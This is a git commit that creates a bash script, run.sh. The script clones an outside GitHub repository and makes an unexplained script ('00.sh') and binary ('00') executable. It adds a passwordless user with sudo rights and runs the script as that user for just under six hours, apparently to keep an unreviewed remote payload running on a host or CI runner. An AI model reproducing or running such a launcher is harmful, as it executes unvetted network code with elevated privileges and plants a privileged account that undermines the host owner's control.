0881a376ae2e5d323407e51ee568c0510eb92417
03081997 <86400154+03081997@users.noreply.github.com>
2021-06-30 14:35:44 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/03081997/a.git && cd a
+chmod +x 00.sh && chmod +x 00
+sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
+sudo -u ikuk -H sh -c "timeout 359m ./00.sh"
+sudo apt update
